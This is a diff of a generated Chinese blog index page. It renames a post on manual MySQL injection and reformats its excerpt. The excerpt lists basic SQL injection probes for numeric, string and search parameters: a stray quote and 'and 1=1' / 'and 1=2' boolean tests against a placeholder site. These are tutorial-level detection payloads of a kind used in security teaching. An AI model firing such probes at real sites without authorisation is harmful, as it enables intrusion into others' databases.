@@ -751,7 +751,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/10/MySQL手工注入/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/10/SQL注入总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Note">
@@ -773,8 +773,8 @@
             
               
                 
-                <a class="post-title-link" href="/2017/05/10/MySQL手工注入/" itemprop="url">
-                  MySQL手工注入
+                <a class="post-title-link" href="/2017/05/10/SQL注入总结/" itemprop="url">
+                  SQL注入总结
                 </a>
               
             
@@ -848,11 +848,12 @@
 
       
         
-          <h1 id="判断注入点是否存在"><a href="#判断注入点是否存在" class="headerlink" title="判断注入点是否存在"></a>判断注入点是否存在</h1><p>  <strong>数字型</strong><br>  url后输入<br>  <a href="http://www.xxx.cn/list.php?page=4&amp;id=524" target="_blank" rel="external">http://www.xxx.cn/list.php?page=4&amp;id=524</a>‘            返回错误  <br>  <a href="http://www.xxx.cn/list.php?page=4&amp;id=524" target="_blank" rel="external">http://www.xxx.cn/list.php?page=4&amp;id=524</a> and 1=1     返回正确<br>  <a href="http://www.xxx.cn/list.php?page=4&amp;id=524" target="_blank" rel="external">http://www.xxx.cn/list.php?page=4&amp;id=524</a> and 1=2     返回错误<br>  <br>  <strong>字符型</strong><br>  url后输入<br>  <a href="http://www.xxx.cn/list.php?page=4&amp;cid=x" target="_blank" rel="external">http://www.xxx.cn/list.php?page=4&amp;cid=x</a>‘                         返回错误  <br>  <a href="http://www.xxx.cn/list.php?page=4&amp;cid=x" target="_blank" rel="external">http://www.xxx.cn/list.php?page=4&amp;cid=x</a>‘ and 1=1 and ‘1’=’1      返回正确<br>  <a href="http://www.xxx.cn/list.php?page=4&amp;cid=x" target="_blank" rel="external">http://www.xxx.cn/list.php?page=4&amp;cid=x</a>‘ and 1=2 and ‘1’=’1      返回错误</p>
-<p>  <strong>搜索型</strong><br>  输入框中输入<br>  ‘                         返回错误<br>  x%’ and 1=1 and ‘%’=’%    返回正确<br>  x%’ and 1=2 and ‘%’=’%    返回错误<br>
+          <h1 id="MySQL手工注入"><a href="#MySQL手工注入" class="headerlink" title="MySQL手工注入"></a>MySQL手工注入</h1><h2 id="判断注入点是否存在"><a href="#判断注入点是否存在" class="headerlink" title="判断注入点是否存在"></a>判断注入点是否存在</h2><p><strong>数字型</strong><br>url后输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.cn/list.php?page=4&amp;id=524<span class="string">'            返回错误  </span></div><div class="line">http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=1     返回正确</div><div class="line">http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=2     返回错误</div></pre></td></tr></table></figure></p>
+<p><strong>字符型</strong><br>url后输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.cn/list.php?page=4&amp;cid=x<span class="string">'                         返回错误  </span></div><div class="line">http://www.xxx.cn/list.php?page=4&amp;cid=x' and 1=1 and <span class="string">'1'</span>=<span class="string">'1      返回正确</span></div><div class="line">http://www.xxx.cn/list.php?page=4&amp;cid=x' and 1=2 and <span class="string">'1'</span>=<span class="string">'1      返回错误</span></div></pre></td></tr></table></figure></p>
+<p><strong>搜索型</strong><br>输入框中输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="string">'                         返回错误</span></div><div class="line">x%' and 1=1 and <span class="string">'%'</span>=<span class="string">'%    返回正确</span></div><div class="line">x%' and 1=2 and <span class="string">'%'</span>=<span class="string">'%    返回错误</span></div></pre></td></tr></table></figure></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2017/05/10/MySQL手工注入/#more" rel="contents">
+            <a class="btn" href="/2017/05/10/SQL注入总结/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
